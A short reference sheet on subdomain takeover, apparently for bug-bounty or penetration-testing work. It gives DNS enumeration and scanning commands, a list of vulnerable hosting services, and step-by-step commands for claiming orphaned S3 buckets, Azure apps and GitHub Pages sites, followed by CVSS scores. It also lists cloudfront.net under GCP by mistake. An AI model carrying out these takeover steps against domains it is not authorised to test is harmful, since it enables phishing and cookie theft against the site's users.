# Subdomain Takeover: Complete Reference

## Detection

### DNS Enumeration
```bash
# Find subdomains pointing to external services
subfinder -d target.com
amass enum -d target.com
assetfinder target.com

# Check for dangling DNS records
# CNAME pointing to a service we can claim
dig CNAME sub.target.com
nslookup sub.target.com
```

### Common Takeover Candidates
```bash
# Cloud platforms
AWS: cloudfront.net, elasticbeanstalk.com, s3.amazonaws.com
Azure: azurewebsites.net, trafficmanager.net, cloudapp.net
GCP: appspot.com, storage.googleapis.com, cloudfront.net
Heroku: herokuapp.com, herokudns.com
GitHub: github.io
Shopify: myshopify.com
WordPress: wordpress.com
Squarespace: squarespace.com
Tumblr: tumblr.com
Ghost: ghost.io

# CDN/DNS
Cloudflare: cdn.cloudflare.net
Fastly: fastly.net
Akamai: akamaihd.net
```

### Automated Scan
```bash
# Nuclei template
nuclei -t cves/misconfigurations/subdomain-takeover.yaml -l subdomains.txt

# SubOver tool
subover -l subdomains.txt

# TakeOver
takeover -l subdomains.txt -v
```

## Exploitation

### AWS S3 Takeover
```bash
1. Find: sub.target.com CNAME -> bucket.s3.amazonaws.com
2. Check bucket doesn't exist:
   aws s3 ls s3://bucket
3. Claim it:
   aws s3 mb s3://bucket
4. Upload content:
   aws s3 cp index.html s3://bucket/
5. Enable static hosting:
   aws s3 website s3://bucket --index-document index.html
```

### Azure Takeover
```bash
1. Find: sub.target.com CNAME -> app.azurewebsites.net
2. Deploy app with same name to Azure
3. Verify takeover
```

### GitHub Pages
```bash
1. Find: sub.target.com CNAME -> username.github.io
2. Create repo username.github.io
3. Add CNAME file with sub.target.com
4. Custom domain verified
```

## CVSS Scoring
| Scenario | CVSS | Criteria |
|----------|------|---------|
| Subdomain takeover -> cookie theft | 8.1 | Network, Low, No auth, Changed scope |
| Subdomain takeover -> phishing | 7.5 | Network, Low, No auth |
| Subdomain takeover -> content injection | 6.1 | Network, Low, User interaction |